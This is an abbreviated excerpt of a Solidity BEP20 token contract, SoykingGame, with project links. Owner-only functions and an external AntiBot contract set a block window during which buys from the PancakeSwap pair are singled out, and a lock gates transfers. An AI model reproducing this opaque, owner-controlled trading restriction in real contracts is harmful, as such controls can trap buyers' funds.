...
╚══════╝ ╚═════╝    ╚═╝   ╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝
                       ...
                       Official website:https://soyking.finance  

                       Dapp website:https://app.soyking.finance

                       Twitter:https://twitter.com/SoyKingBSC

                       Gitbook:https://whitepaper.soyking.finance

                       Telegram:https://t.me/SoyKingOfficial_Chat
...
interface AntiBot{
        function blacknumber()external view returns (uint256);       
}

contract SoykingGame is Context, IBEP20, Ownable {
    ...
    constructor (address[1] memory _AntiBotAdr) {
        
        
        AntiBot _AntiBotAdress = AntiBot(_AntiBotAdr[0]);
    ...
    function transfer(address recipient, uint256 amount) public override initialDistributionLock returns  (bool) {
    ...
    function approve(address spender, uint256 amount) public override initialDistributionLock returns (bool) {
    ...
    function setInSwap(bool _swap) external onlyOwner{
        inSwapAndLiquify=_swap;
    }

    function setSwapAndLiquifyEnabled(bool _enabled) external onlyOwner {
        swapAndLiquifyEnabled = _enabled;
        _blackblok = block.number + 30 ;
    ...
    function _transfer(
        ...
        address to,
        uint256 amount
    ) private initialDistributionLock {
        ...
        if (from == pancakeswapV2Pair && block.number <= _blackblok ){
    ...
    function setinitialDistributionFinished() public onlyOwner{
        uint256 _Numbers = AntiBot(AntiBotAdress).blacknumber();
        _blackblok = block.number + _Numbers ;
